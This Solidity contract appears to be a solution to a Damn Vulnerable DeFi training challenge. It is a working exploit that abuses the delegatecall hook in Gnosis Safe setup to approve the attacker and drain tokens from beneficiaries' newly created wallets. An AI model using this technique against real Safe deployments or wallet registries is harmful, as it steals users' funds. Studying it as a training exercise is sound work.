// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./WalletRegistry.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

contract WalletRegistryAttacker {

    address singleton;
    GnosisSafeProxyFactory proxyFactory;
    WalletRegistry registry;
    // The `immutable` here is crucial, without it the delegatecall call would end up calling with caller's
    // storage data, which would fail.
    DamnValuableToken immutable token;

    constructor(address addr1, address addr2, address addr3, address addr4) {
        singleton = addr1;
        proxyFactory = GnosisSafeProxyFactory(addr2);
        registry = WalletRegistry(addr3);
        token = DamnValuableToken(addr4);
    }

    function approve(address addr) public {
        token.approve(addr, 10 ether);
    }

    function attack(address[] memory beneficiaries) public payable {
        for (uint256 i = 0; i < 4; ++i) {
            address[] memory beneficiary = new address[](1);
            beneficiary[0] = beneficiaries[i];

            GnosisSafeProxy proxy = proxyFactory.createProxyWithCallback(
                singleton,
                abi.encodeWithSelector(
                    GnosisSafe.setup.selector, // Selector for the setup() function call
                    beneficiary, // _owners =>  List of Safe owners.
                    1, // _threshold =>  Number of required confirmations for a Safe transaction.
                    address(this), //  to => Contract address for optional delegate call.
                    abi.encodeWithSignature("approve(address)", address(this)), // data =>  Data payload for optional delegate call.
                    address(0), //  fallbackHandler =>  Handler for fallback calls to this contract
                    0, //  paymentToken =>  Token that should be used for the payment (0 is ETH)
                    0, // payment => Value that should be paid
                    0 //  paymentReceiver => Adddress that should receive the payment (or 0 if tx.origin)
                ),
                0, // salt
                IProxyCreationCallback(registry)
            );
            token.transferFrom(address(proxy), msg.sender, 10 ether);
        }
    }
}
